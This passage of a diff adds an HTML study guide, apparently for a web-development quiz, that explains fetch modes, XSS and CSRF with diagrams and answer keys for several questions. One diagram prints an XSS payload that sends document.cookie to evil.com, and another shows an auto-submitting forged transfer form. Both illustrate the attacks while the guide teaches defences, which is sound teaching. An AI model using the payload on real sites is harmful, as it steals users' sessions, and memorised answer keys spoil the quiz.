+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">fetch modes side by side</text>
+
+    <!-- cors -->
+    <rect x="8" y="26" width="222" height="200" rx="9" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2.4"/>
+    <text x="119" y="46" font-size="11" font-weight="800" fill="#1f7a3a" text-anchor="middle">mode: 'cors'</text>
+    <text x="119" y="61" font-size="8.4" font-weight="700" fill="#1f7a3a" text-anchor="middle">THE DEFAULT</text>
+    <g font-size="8.6" fill="#22303f">
+      <text x="22" y="84">&bull; cross-origin requests allowed</text>
+      <text x="22" y="102">&bull; needs the server's CORS header</text>
+      <text x="22" y="120">&bull; you CAN read the response</text>
+      <text x="22" y="138">&bull; any method you like</text>
+      <text x="22" y="156">&bull; fails loudly with a CORS error</text>
+      <text x="30" y="168">if permission is missing</text>
+    </g>
+    <rect x="22" y="182" width="194" height="34" rx="6" fill="#fff" stroke="#1f7a3a"/>
+    <text x="119" y="196" font-size="8.6" font-weight="700" fill="#1f7a3a" text-anchor="middle">Use this almost always.</text>
+    <text x="119" y="209" font-size="8.4" fill="#22303f" text-anchor="middle">Q4 option A describes this.</text>
+
+    <!-- no-cors -->
+    <rect x="240" y="26" width="222" height="200" rx="9" fill="#f0ecfd" stroke="#5b3ec8" stroke-width="2.4"/>
+    <text x="351" y="46" font-size="11" font-weight="800" fill="#5b3ec8" text-anchor="middle">mode: 'no-cors'</text>
+    <text x="351" y="61" font-size="8.4" font-weight="700" fill="#5b3ec8" text-anchor="middle">GIVES AN OPAQUE RESPONSE</text>
+    <g font-size="8.6" fill="#22303f">
+      <text x="254" y="84">&bull; request is sent, no CORS check</text>
+      <text x="254" y="102">&bull; response is <tspan font-weight="800" fill="#5b3ec8">opaque</tspan>: status 0,</text>
+      <text x="262" y="114">body null, headers empty</text>
+      <text x="254" y="132">&bull; you <tspan font-weight="800" fill="#b52020">cannot read</tspan> anything</text>
+      <text x="254" y="150">&bull; methods limited to</text>
+      <text x="262" y="162">GET, HEAD and POST only</text>
+    </g>
+    <rect x="254" y="176" width="194" height="40" rx="6" fill="#fff" stroke="#5b3ec8"/>
+    <text x="351" y="189" font-size="8.6" font-weight="700" fill="#5b3ec8" text-anchor="middle">"selective request methods"</text>
+    <text x="351" y="201" font-size="8.4" fill="#22303f" text-anchor="middle">This restriction is what Q3</text>
+    <text x="351" y="212" font-size="8.4" fill="#22303f" text-anchor="middle">option A is referring to.</text>
+
+    <!-- same-origin -->
+    <rect x="472" y="26" width="220" height="200" rx="9" fill="#fff1e6" stroke="#d9480f" stroke-width="2.4"/>
+    <text x="582" y="46" font-size="11" font-weight="800" fill="#d9480f" text-anchor="middle">mode: 'same-origin'</text>
+    <text x="582" y="61" font-size="8.4" font-weight="700" fill="#d9480f" text-anchor="middle">STRICTEST</text>
+    <g font-size="8.6" fill="#22303f">
+      <text x="486" y="84">&bull; only your own origin</text>
+      <text x="486" y="102">&bull; any cross-origin attempt is</text>
+      <text x="494" y="114">rejected immediately</text>
+      <text x="486" y="132">&bull; you CAN read the response</text>
+      <text x="486" y="150">&bull; useful when you want to be</text>
+      <text x="494" y="162">certain nothing leaves the site</text>
+    </g>
+    <rect x="486" y="176" width="192" height="40" rx="6" fill="#fff" stroke="#d9480f"/>
+    <text x="582" y="189" font-size="8.6" font-weight="700" fill="#d9480f" text-anchor="middle">A deliberate lockdown,</text>
+    <text x="582" y="201" font-size="8.4" fill="#22303f" text-anchor="middle">rarely needed because it is</text>
+    <text x="582" y="212" font-size="8.4" fill="#22303f" text-anchor="middle">already the safe direction.</text>
+  </svg>
+  <figcaption><span class="fignum">Figure 4.2</span> &ndash; An <b>opaque</b> response proves delivery happened but reveals nothing, and it restricts you to GET, HEAD and POST.</figcaption>
+</figure>
+
+<!-- ---------------------------- Q4 ---------------------------- -->
+<div class="qhead">Question 4 <span class="mark">1 mark &bull; pick the FALSE one</span></div>
+<div class="qbody">
+  <p class="qtext">Which of the following statements is <b>false</b> regarding fetch API?</p>
+  <ul class="opts">
+    <li class="wrong"><span class="lab">A.</span> The fetch API uses "cors" mode to fetch the data by making cross-origin requests.</li>
+    <li class="right"><span class="lab">B.</span> The fetch API uses "HEAD" as the default request method.</li>
+    <li class="wrong"><span class="lab">C.</span> The fetch API allows a developer to control whether the cookies are to be sent with the request or not.</li>
+    <li class="wrong"><span class="lab">D.</span> All of the above</li>
+  </ul>
+</div>
+
+<h3>Option-by-option reasoning</h3>
+<table>
+  <tr><th style="width:60px" class="c">Option</th><th style="width:88px" class="c">True or false</th><th>Why</th></tr>
+  <tr><td class="c"><b>A</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td><code>cors</code> is <code>fetch</code>'s <b>default mode</b>, and it is the mode used for
+      cross-origin requests. Left panel of Figure 4.2.</td></tr>
+  <tr><td class="c"><b>B</b></td><td class="c"><span class="pill f">FALSE</span><br/><small>the answer</small></td>
+      <td>The default method is <b>GET</b>, not HEAD. That is why
+      <code>fetch('/api/data')</code> with no options performs a GET.
+      <br/>HEAD is a real method &ndash; it asks for the headers <b>without the body</b>, useful for
+      checking whether a file exists or how big it is &ndash; but you must request it explicitly
+      with <code>method: 'HEAD'</code>. It is never the default.</td></tr>
+  <tr><td class="c"><b>C</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>That is exactly what the <code>credentials</code> option does:
+      <code>'omit'</code> sends no cookies, <code>'same-origin'</code> sends them only to your own
+      origin (the default), and <code>'include'</code> sends them cross-origin too.</td></tr>
+  <tr><td class="c"><b>D</b></td><td class="c"><span class="pill f">FALSE</span></td>
+      <td>Careful with the logic here. In a "pick the false statement" question,
+      "All of the above" would mean <b>all three are false</b>. Since A and C are true, that
+      cannot hold.</td></tr>
+</table>
+
+<div class="ans">
+  <span class="boxtitle">Answer to Question 4</span>
+  <span class="big">Option B</span> is the false statement.
+  <br/><small>The default method is GET. Matches your selection.</small>
+</div>
+
+<div class="kid">
+  <span class="boxtitle">Why GET must be the default</span>
+  If you type <code>fetch('/api/data')</code> you clearly want to <b>get</b> the data. A HEAD
+  request would return headers with an empty body, so the obvious code would return nothing
+  useful. Defaults are chosen to match the common intention &ndash; which is a handy way to
+  reason your way to the answer even if you have forgotten it.
+</div>
+
+
+<!-- ============================== PART 5 ============================== -->
+<h1 class="part"><span class="kicker">Part 5 &bull; Question 5</span>XSS: Cross-Site Scripting</h1>
+
+<div class="analogy">
+  <span class="boxtitle">Story box &bull; the poisoned notice board</span>
+  A school notice board lets any student pin up a message, and the office copies every message
+  onto the school website exactly as written.
+  <br/><br/>
+  A mischievous student pins up a note that is not really a message at all &ndash; it is an
+  <b>instruction</b>: "whoever reads this, hand over your lunch money". Because the office copies
+  it blindly, every visitor's browser now obeys the instruction, believing it came from the school.
+  <br/><br/>
+  That is <b>XSS</b>: the attacker gets <b>their own script</b> to run inside <b>someone else's
+  page</b>, so the browser trusts it as if the site had written it.
+</div>
+
+<div class="note">
+  <span class="boxtitle">Definition box &bull; XSS</span>
+  <b>Cross-Site Scripting (XSS)</b> is an exploit in which an attacker <b>injects malicious
+  client-side scripts</b> into a web page viewed by other users. The root cause is that the
+  application takes user input and puts it into a page <b>without validating or escaping it</b>.
+</div>
+
+<figure>
+  <svg viewBox="0 0 700 275" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <marker id="x1" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+        <path d="M0,0 L7,3.2 L0,6.4 z" fill="#b52020"/></marker>
+    </defs>
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">An XSS attack, step by step</text>
+
+    <!-- step 1 -->
+    <rect x="14" y="26" width="672" height="50" rx="8" fill="#fdecec" stroke="#b52020" stroke-width="2"/>
+    <text x="28" y="44" font-size="9.8" font-weight="800" fill="#b52020">STEP 1 &ndash; the attacker types a "comment" that is really a script</text>
+    <rect x="28" y="50" width="440" height="20" rx="4" fill="#1e2430"/>
+    <text x="38" y="64" font-size="8" fill="#7fd1b9">&lt;script&gt;fetch('http://evil.com?c='+document.cookie)&lt;/script&gt;</text>
+    <text x="480" y="64" font-size="8.6" font-weight="700" fill="#b52020">it steals cookies</text>
+
+    <!-- step 2 -->
+    <rect x="14" y="84" width="672" height="50" rx="8" fill="#fff1e6" stroke="#d9480f" stroke-width="2"/>
+    <text x="28" y="102" font-size="9.8" font-weight="800" fill="#d9480f">STEP 2 &ndash; the server saves it without checking, and later prints it into the page</text>
+    <rect x="28" y="108" width="300" height="20" rx="4" fill="#1e2430"/>
+    <text x="38" y="122" font-size="8" fill="#ffcb6b">&lt;div&gt;{{ comment | safe }}&lt;/div&gt;</text>
+    <text x="340" y="122" font-size="8.6" font-weight="700" fill="#d9480f">no validation, no escaping &ndash; this is the bug</text>
+
+    <!-- step 3 -->
+    <rect x="14" y="142" width="672" height="58" rx="8" fill="#fdecec" stroke="#b52020" stroke-width="2"/>
+    <text x="28" y="160" font-size="9.8" font-weight="800" fill="#b52020">STEP 3 &ndash; an innocent user opens the page and their browser RUNS the script</text>
+    <rect x="28" y="166" width="120" height="28" rx="5" fill="#fff" stroke="#b52020" stroke-width="1.8"/>
+    <text x="88" y="184" font-size="8.6" font-weight="700" fill="#b52020" text-anchor="middle">innocent user</text>
+    <path d="M154 180 H244" stroke="#b52020" stroke-width="2" marker-end="url(#x1)"/>
+    <text x="199" y="176" font-size="7.6" font-weight="700" fill="#b52020" text-anchor="middle">loads page</text>
+    <rect x="250" y="166" width="150" height="28" rx="5" fill="#fff" stroke="#b52020" stroke-width="1.8"/>
+    <text x="325" y="178" font-size="8.4" font-weight="700" fill="#b52020" text-anchor="middle">the script runs, trusted</text>
+    <text x="325" y="189" font-size="8.4" font-weight="700" fill="#b52020" text-anchor="middle">because it is "from the site"</text>
+    <path d="M406 180 H496" stroke="#b52020" stroke-width="2" marker-end="url(#x1)"/>
+    <text x="451" y="176" font-size="7.6" font-weight="700" fill="#b52020" text-anchor="middle">sends cookie</text>
+    <rect x="502" y="166" width="170" height="28" rx="5" fill="#b52020"/>
+    <text x="587" y="184" font-size="8.6" font-weight="700" fill="#fff" text-anchor="middle">attacker now has the session</text>
+
+    <!-- root cause -->
+    <rect x="14" y="208" width="672" height="60" rx="8" fill="#e8f0fb" stroke="#1b4f9c" stroke-width="2.2"/>
+    <text x="350" y="226" font-size="10.4" font-weight="800" fill="#1b4f9c" text-anchor="middle">THE ROOT CAUSE, in one sentence</text>
+    <text x="350" y="244" font-size="9.4" fill="#22303f" text-anchor="middle">The application could not tell the difference between DATA ("nice photo!") and CODE ("&lt;script&gt;...").</text>
+    <text x="350" y="259" font-size="9.4" font-weight="700" fill="#1b4f9c" text-anchor="middle">That failure is a lack of validation of data &ndash; which is exactly what Q5 option B says.</text>
+  </svg>
+  <figcaption><span class="fignum">Figure 5.1</span> &ndash; XSS: injected client-side script, running with the trust of the host page.</figcaption>
+</figure>
+
+<h2>5.1 How XSS is prevented</h2>
+
+<figure>
+  <svg viewBox="0 0 700 175" xmlns="http://www.w3.org/2000/svg">
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">The fix: treat user input as data, never as code</text>
+    <g font-size="8.8">
+      <rect x="14" y="28" width="220" height="136" rx="8" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2.2"/>
+      <text x="124" y="48" font-size="10" font-weight="800" fill="#1f7a3a" text-anchor="middle">ESCAPE ON OUTPUT</text>
+      <text x="28" y="68" fill="#22303f">Turn the dangerous characters</text>
+      <text x="28" y="80" fill="#22303f">into harmless text before</text>
+      <text x="28" y="92" fill="#22303f">printing them.</text>
+      <rect x="28" y="100" width="192" height="20" rx="4" fill="#1e2430"/>
+      <text x="36" y="114" font-size="7.6" fill="#7fd1b9">&lt;script&gt;  becomes  &amp;lt;script&amp;gt;</text>
+      <text x="28" y="136" fill="#22303f">It now DISPLAYS as text</text>
+      <text x="28" y="148" fill="#22303f">instead of RUNNING.</text>
+      <text x="28" y="160" font-weight="700" fill="#1f7a3a">Jinja2 does this by default.</text>
+
+      <rect x="240" y="28" width="220" height="136" rx="8" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2.2"/>
+      <text x="350" y="48" font-size="10" font-weight="800" fill="#1f7a3a" text-anchor="middle">VALIDATE ON INPUT</text>
+      <text x="254" y="68" fill="#22303f">Check the shape of the data</text>
+      <text x="254" y="80" fill="#22303f">before accepting it at all.</text>
+      <text x="254" y="98" fill="#22303f">&bull; is this field really a number?</text>
+      <text x="254" y="112" fill="#22303f">&bull; is this really an email?</text>
+      <text x="254" y="126" fill="#22303f">&bull; strip or reject HTML tags</text>
+      <text x="254" y="148" font-weight="700" fill="#1f7a3a">Reject bad data at the door,</text>
+      <text x="254" y="160" font-weight="700" fill="#1f7a3a">not on the way out.</text>
+
+      <rect x="466" y="28" width="220" height="136" rx="8" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2.2"/>
+      <text x="576" y="48" font-size="10" font-weight="800" fill="#1f7a3a" text-anchor="middle">EXTRA LAYERS</text>
+      <text x="480" y="68" fill="#22303f">&bull; <tspan font-weight="700">Content Security Policy</tspan></text>
+      <text x="490" y="80" fill="#22303f">tells the browser which</text>
+      <text x="490" y="92" fill="#22303f">scripts it may run at all</text>
+      <text x="480" y="110" fill="#22303f">&bull; <tspan font-weight="700">HttpOnly cookies</tspan></text>
+      <text x="490" y="122" fill="#22303f">cannot be read by</text>
+      <text x="490" y="134" fill="#22303f">JavaScript, so a stolen</text>
+      <text x="490" y="146" fill="#22303f">script cannot grab them</text>
+      <text x="480" y="160" font-weight="700" fill="#1f7a3a">Defence in depth.</text>
+    </g>
+  </svg>
+  <figcaption><span class="fignum">Figure 5.2</span> &ndash; Notice that <b>none</b> of these defences is a CSRF token. That matters for Q5 option C.</figcaption>
+</figure>
+
+<!-- ---------------------------- Q5 ---------------------------- -->
+<div class="qhead">Question 5 <span class="mark">1 mark &bull; select all that apply</span></div>
+<div class="qbody">
+  <p class="qtext">Which of the following is/are correct statements?</p>
+  <ul class="opts">
+    <li class="right"><span class="lab">A.</span> XSS (cross site scripting) is an exploit which allows attackers to inject malicious client side scripts.</li>
+    <li class="right"><span class="lab">B.</span> The main reason for XSS is lack of validation of data.</li>
+    <li class="wrong"><span class="lab">C.</span> CSRF token is generally used to stop these attacks.</li>
+    <li class="wrong"><span class="lab">D.</span> All of the above</li>
+  </ul>
+</div>
+
+<h3>Option-by-option reasoning</h3>
+<table>
+  <tr><th style="width:60px" class="c">Option</th><th style="width:64px" class="c">Verdict</th><th>Why</th></tr>
+  <tr><td class="c"><b>A</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>The textbook definition, and every phrase in it is right: it is an <b>exploit</b>, the
+      scripts are <b>client-side</b> (they run in the victim's browser), and they are
+      <b>injected</b> into a page.</td></tr>
+  <tr><td class="c"><b>B</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>The underlying cause is that untrusted input is accepted and rendered without being
+      validated or escaped &ndash; the application cannot tell data from code. Bottom band of
+      Figure 5.1.</td></tr>
+  <tr><td class="c"><b>C</b></td><td class="c"><span class="pill f">FALSE</span></td>
+      <td><b>Wrong attack.</b> "These attacks" refers to XSS, and a <b>CSRF token stops CSRF</b>,
+      not XSS. XSS is stopped by <b>escaping output and validating input</b> (Figure 5.2).
+      <br/>Worse still, a CSRF token is no help at all against XSS: if an attacker can run
+      JavaScript inside your page, that script can simply <b>read the CSRF token off the page</b>
+      and use it. XSS defeats CSRF protection, not the other way round.</td></tr>
+  <tr><td class="c"><b>D</b></td><td class="c"><span class="pill f">FALSE</span></td>
+      <td>Requires C to be true. It is not.</td></tr>
+</table>
+
+<div class="ans">
+  <span class="boxtitle">Answer to Question 5</span>
+  <span class="big">A and B</span>
+  <br/><small>What XSS is, and why it happens. The CSRF token belongs to a different attack.
+  Matches your selection.</small>
+</div>
+
+<h2>5.2 XSS and CSRF are different attacks &ndash; keep them apart</h2>
+
+<table>
+  <tr><th style="width:150px">&nbsp;</th><th>XSS</th><th>CSRF</th></tr>
+  <tr><td><b>What the attacker does</b></td><td>injects a <b>script</b> into your page</td>
+      <td>tricks the browser into <b>sending a request</b></td></tr>
+  <tr><td><b>What is abused</b></td><td>the site's trust in <b>user input</b></td>
+      <td>the site's trust in the <b>logged-in user's browser</b></td></tr>
+  <tr><td><b>Does code run on the victim's page?</b></td><td><b>yes</b>, attacker's JavaScript executes</td>
+      <td><b>no</b>, it is just an ordinary-looking request</td></tr>
+  <tr><td><b>Can the attacker read the response?</b></td><td><b>yes</b> &ndash; that is why it is so dangerous</td>
+      <td><b>no</b> &ndash; it is a blind, fire-and-forget action</td></tr>
+  <tr><td><b>Main defence</b></td><td><b>escape output, validate input</b>, CSP</td>
+      <td><b>CSRF token</b>, SameSite cookies, checking Origin</td></tr>
+</table>
+
+<!-- ============================== PART 6 ============================== -->
+<h1 class="part"><span class="kicker">Part 6 &bull; Questions 6 and 7</span>CSRF, and the token that stops it</h1>
+
+<div class="analogy">
+  <span class="boxtitle">Story box &bull; the signed blank cheque</span>
+  You are logged into your bank in one tab. Being logged in means your browser holds a
+  <b>session cookie</b>, and it attaches that cookie <b>automatically</b> to every request
+  going to the bank &ndash; without asking you.
+  <br/><br/>
+  Now you open a different site showing a funny cat picture. Hidden in that page is a form that
+  quietly submits a transfer request to your bank. Your browser, being helpfully obedient,
+  <b>attaches your bank cookie to it</b>.
+  <br/><br/>
+  The bank sees a properly authenticated request from you and carries it out. You never clicked
+  anything about a transfer. <b>The attacker never needed your password</b> &ndash; they borrowed
+  your logged-in browser.
+</div>
+
+<div class="note">
+  <span class="boxtitle">Definition box &bull; CSRF</span>
+  <b>Cross-Site Request Forgery (CSRF)</b> makes an authenticated user's browser send a request
+  the user did not intend. It works by <b>exploiting the trust</b> that exists between the
+  application and its <b>authenticated users</b>: the application cannot tell a
+  <b>forged request</b> apart from a genuine one generated by its own user interface.
+</div>
+
+<figure>
+  <svg viewBox="0 0 700 285" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <marker id="c1" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+        <path d="M0,0 L7,3.2 L0,6.4 z" fill="#b52020"/></marker>
+      <marker id="c2" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+        <path d="M0,0 L7,3.2 L0,6.4 z" fill="#1f7a3a"/></marker>
+    </defs>
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">A CSRF attack, step by step</text>
+
+    <rect x="14" y="26" width="672" height="42" rx="8" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2"/>
+    <text x="28" y="44" font-size="9.8" font-weight="800" fill="#1f7a3a">STEP 1 &ndash; you log in to the bank, quite normally</text>
+    <text x="28" y="60" font-size="8.8" fill="#22303f">The bank sets a session cookie in your browser. From now on your browser sends it to the bank automatically.</text>
+
+    <rect x="14" y="76" width="672" height="42" rx="8" fill="#fff1e6" stroke="#d9480f" stroke-width="2"/>
+    <text x="28" y="94" font-size="9.8" font-weight="800" fill="#d9480f">STEP 2 &ndash; still logged in, you visit an unrelated malicious page</text>
+    <text x="28" y="110" font-size="8.8" fill="#22303f">You have done nothing wrong. Opening a page is not a crime, and the page looks harmless.</text>
+
+    <rect x="14" y="126" width="672" height="52" rx="8" fill="#fdecec" stroke="#b52020" stroke-width="2"/>
+    <text x="28" y="144" font-size="9.8" font-weight="800" fill="#b52020">STEP 3 &ndash; that page contains a hidden form which submits itself</text>
+    <rect x="28" y="150" width="420" height="22" rx="4" fill="#1e2430"/>
+    <text x="38" y="165" font-size="7.6" fill="#7fd1b9">&lt;form action="https://bank.com/transfer" method="POST"&gt; ... auto-submit</text>
+    <text x="460" y="165" font-size="8.6" font-weight="700" fill="#b52020">no clicking required</text>
+
+    <rect x="14" y="186" width="672" height="56" rx="8" fill="#fdecec" stroke="#b52020" stroke-width="2"/>
+    <text x="28" y="204" font-size="9.8" font-weight="800" fill="#b52020">STEP 4 &ndash; the browser attaches your bank cookie, and the bank obeys</text>
+    <rect x="28" y="210" width="112" height="26" rx="5" fill="#fff" stroke="#b52020" stroke-width="1.8"/>
+    <text x="84" y="227" font-size="8.4" font-weight="700" fill="#b52020" text-anchor="middle">your browser</text>
+    <path d="M146 223 H262" stroke="#b52020" stroke-width="2" marker-end="url(#c1)"/>
+    <text x="204" y="219" font-size="7.6" font-weight="700" fill="#b52020" text-anchor="middle">POST /transfer + your cookie</text>
+    <rect x="268" y="210" width="112" height="26" rx="5" fill="#fff" stroke="#b52020" stroke-width="1.8"/>
+    <text x="324" y="227" font-size="8.4" font-weight="700" fill="#b52020" text-anchor="middle">bank.com</text>
+    <text x="400" y="220" font-size="8.6" font-weight="700" fill="#b52020">"valid session, so this must</text>
+    <text x="400" y="232" font-size="8.6" font-weight="700" fill="#b52020">really be the user" &ndash; money gone</text>
+
+    <rect x="14" y="250" width="672" height="30" rx="8" fill="#e8f0fb" stroke="#1b4f9c" stroke-width="2.2"/>
+    <text x="350" y="269" font-size="9.8" font-weight="800" fill="#1b4f9c" text-anchor="middle">The bank's fatal flaw: it could not tell a FORGED request from one made by its own web page.</text>
+  </svg>
+  <figcaption><span class="fignum">Figure 6.1</span> &ndash; Both statements in Q6 describe this one picture from two different angles.</figcaption>
+</figure>
+
+<!-- ---------------------------- Q6 ---------------------------- -->
+<div class="qhead">Question 6 <span class="mark">1 mark &bull; single correct</span></div>
+<div class="qbody">
+  <p class="qtext">Which of the following is true regarding CSRF attacks?</p>
+  <ul class="opts">
+    <li class="wrong"><span class="lab">A.</span> It exploits the trust of a web application against their authenticated users.</li>
+    <li class="wrong"><span class="lab">B.</span> It happens when a web application is not able to differentiate between the forged request and request generated from the same website's user interface.</li>
+    <li class="right"><span class="lab">C.</span> Both A and B</li>
+    <li class="wrong"><span class="lab">D.</span> None of the above</li>
+  </ul>
+</div>
+
+<h3>Option-by-option reasoning</h3>
+<table>
+  <tr><th style="width:60px" class="c">Option</th><th style="width:64px" class="c">Verdict</th><th>Why</th></tr>
+  <tr><td class="c"><b>A</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>CSRF is fundamentally an abuse of <b>trust</b>. The application trusts that a request
+      carrying a valid session cookie was genuinely intended by that authenticated user &ndash; and
+      the attacker exploits precisely that assumption.</td></tr>
+  <tr><td class="c"><b>B</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>This states the same weakness from the technical side: the server sees two identical
+      looking POSTs &ndash; one from its own form, one forged by another site &ndash; and has
+      <b>no way to tell them apart</b>. Bottom band of Figure 6.1.</td></tr>
+  <tr><td class="c"><b>C</b></td><td class="c"><span class="pill t">TRUE</span><br/><small>the answer</small></td>
+      <td>Since A and B are both true, "Both A and B" is the correct choice.</td></tr>
+  <tr><td class="c"><b>D</b></td><td class="c"><span class="pill f">FALSE</span></td>
+      <td>Fails because A and B are true.</td></tr>
+</table>
+
+<div class="ans">
+  <span class="boxtitle">Answer to Question 6</span>
+  <span class="big">Option C &ndash; Both A and B</span>
+  <br/><small>Matches your selection.</small>
+</div>
+
+<div class="trap">
+  <span class="boxtitle">Trap box &bull; the classic mix-up of the two "trust" sentences</span>
+  Two similar-sounding sentences float around, and swapping them is a common exam error:
+  <ul style="margin-bottom:0">
+    <li><b>XSS</b> abuses the <b>user's trust in the website</b> &ndash; the victim's browser
+        believes the injected script came from the site.</li>
+    <li><b>CSRF</b> abuses the <b>website's trust in the user</b> &ndash; the server believes the
+        forged request came from its logged-in user.</li>
+  </ul>
+  One sentence points each way. Draw the arrow before you answer.
+</div>
+
+<h2>6.1 The CSRF token</h2>
+
+<div class="analogy">
+  <span class="boxtitle">Story box &bull; the secret word of the day</span>
+  The bank fixes its problem like this. Every time it hands you a genuine transfer form, it also
+  writes a <b>fresh secret word</b> on that form &ndash; and remembers the word for your session.
+  A transfer is accepted <b>only if the correct word comes back with it</b>.
+  <br/><br/>
+  The attacker's hidden form cannot contain the word: they never received your form, and the
+  same-origin policy stops their JavaScript from reading it out of your page. Their forged
+  request arrives with no word, or the wrong one, and is rejected.
+  <br/><br/>
+  That secret word is the <b>CSRF token</b>. Note who writes it: <b>the server</b>. A token the
+  client invented would prove nothing, because the attacker is also a client.
+</div>
+
+<figure>
+  <svg viewBox="0 0 700 265" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <marker id="t1" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+        <path d="M0,0 L7,3.2 L0,6.4 z" fill="#1f7a3a"/></marker>
+      <marker id="t2" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+        <path d="M0,0 L7,3.2 L0,6.4 z" fill="#b52020"/></marker>
+    </defs>
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">How a CSRF token blocks the forgery</text>
+
+    <!-- genuine -->
+    <rect x="14" y="26" width="672" height="94" rx="8" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2.2"/>
+    <text x="28" y="44" font-size="9.8" font-weight="800" fill="#1f7a3a">THE GENUINE REQUEST &ndash; accepted</text>
+    <rect x="28" y="52" width="106" height="30" rx="5" fill="#fff" stroke="#1f7a3a" stroke-width="1.8"/>
+    <text x="81" y="71" font-size="8.4" font-weight="700" fill="#1f7a3a" text-anchor="middle">bank.com</text>
+    <path d="M140 60 H250" stroke="#1f7a3a" stroke-width="2" marker-end="url(#t1)"/>
+    <text x="195" y="56" font-size="7.6" font-weight="700" fill="#1f7a3a" text-anchor="middle">1. form + TOKEN "a9f3"</text>
+    <rect x="256" y="52" width="106" height="30" rx="5" fill="#fff" stroke="#1f7a3a" stroke-width="1.8"/>
+    <text x="309" y="71" font-size="8.4" font-weight="700" fill="#1f7a3a" text-anchor="middle">your browser</text>
+    <path d="M368 96 H140" stroke="#1f7a3a" stroke-width="2" marker-end="url(#t1)"/>
+    <text x="254" y="92" font-size="7.6" font-weight="700" fill="#1f7a3a" text-anchor="middle">2. POST /transfer + cookie + TOKEN "a9f3"</text>
+    <rect x="452" y="52" width="222" height="52" rx="6" fill="#fff" stroke="#1f7a3a" stroke-width="1.8"/>
+    <text x="563" y="70" font-size="8.6" font-weight="800" fill="#1f7a3a" text-anchor="middle">server checks the token</text>
+    <text x="563" y="84" font-size="8.4" fill="#22303f" text-anchor="middle">"a9f3" matches what I stored</text>
+    <text x="563" y="97" font-size="8.6" font-weight="800" fill="#1f7a3a" text-anchor="middle">ACCEPTED</text>
+
+    <!-- forged -->
+    <rect x="14" y="128" width="672" height="94" rx="8" fill="#fdecec" stroke="#b52020" stroke-width="2.2"/>
+    <text x="28" y="146" font-size="9.8" font-weight="800" fill="#b52020">THE FORGED REQUEST &ndash; rejected</text>
+    <rect x="28" y="154" width="106" height="30" rx="5" fill="#fff" stroke="#b52020" stroke-width="1.8"/>
+    <text x="81" y="173" font-size="8.4" font-weight="700" fill="#b52020" text-anchor="middle">evil.com</text>
+    <path d="M140 168 H250" stroke="#b52020" stroke-width="2" marker-end="url(#t2)"/>
+    <text x="195" y="164" font-size="7.6" font-weight="700" fill="#b52020" text-anchor="middle">hidden form, NO token</text>
+    <rect x="256" y="154" width="106" height="30" rx="5" fill="#fff" stroke="#b52020" stroke-width="1.8"/>
+    <text x="309" y="173" font-size="8.4" font-weight="700" fill="#b52020" text-anchor="middle">your browser</text>
+    <path d="M368 198 H140" stroke="#b52020" stroke-width="2" marker-end="url(#t2)"/>
+    <text x="254" y="194" font-size="7.6" font-weight="700" fill="#b52020" text-anchor="middle">POST /transfer + cookie, but token MISSING</text>
+    <rect x="452" y="154" width="222" height="52" rx="6" fill="#fff" stroke="#b52020" stroke-width="1.8"/>
+    <text x="563" y="172" font-size="8.6" font-weight="800" fill="#b52020" text-anchor="middle">server checks the token</text>
+    <text x="563" y="186" font-size="8.4" fill="#22303f" text-anchor="middle">no token, or the wrong one</text>
+    <text x="563" y="199" font-size="8.6" font-weight="800" fill="#b52020" text-anchor="middle">REJECTED  403</text>
+
+    <rect x="14" y="230" width="672" height="30" rx="8" fill="#f0ecfd" stroke="#5b3ec8" stroke-width="2.2"/>
+    <text x="350" y="249" font-size="9.6" font-weight="800" fill="#5b3ec8" text-anchor="middle">Why the attacker cannot get the token: they never received your form, and the same-origin policy blocks them reading it.</text>
+  </svg>
+  <figcaption><span class="fignum">Figure 6.2</span> &ndash; The cookie travels automatically; the token does not. That asymmetry is the whole defence.</figcaption>
+</figure>
+
+<h2>6.2 How the token travels back</h2>
+
+<p>Option C of Question 7 mentions a custom header, so it is worth knowing both routes:</p>
+
+<pre><span class="cm">&lt;!-- ROUTE 1: as a hidden form field --&gt;</span>
+<span class="tg">&lt;form</span> <span class="fn">method</span>=<span class="st">"POST"</span><span class="tg">&gt;</span>
+  <span class="tg">&lt;input</span> <span class="fn">type</span>=<span class="st">"hidden"</span> <span class="fn">name</span>=<span class="st">"csrf_token"</span> <span class="fn">value</span>=<span class="st">"a9f3..."</span><span class="tg">&gt;</span>
+  <span class="tg">&lt;button&gt;</span>Transfer<span class="tg">&lt;/button&gt;</span>
+<span class="tg">&lt;/form&gt;</span>
+</pre>
+
+<pre><span class="cm">// ROUTE 2: as a CUSTOM HEADER, which is what AJAX and fetch normally use</span>
+<span class="fn">fetch</span>(<span class="st">'/transfer'</span>, {
+  method: <span class="st">'POST'</span>,
+  headers: { <span class="st">'X-CSRFToken'</span>: token },   <span class="cm">// a custom header</span>
+  body: <span class="fn">JSON.stringify</span>(data)
+})
+</pre>
+
+<div class="key">
+  <span class="boxtitle">Why a custom header is itself a small defence</span>
+  A plain HTML form <b>cannot</b> set custom headers. So the moment a request carries
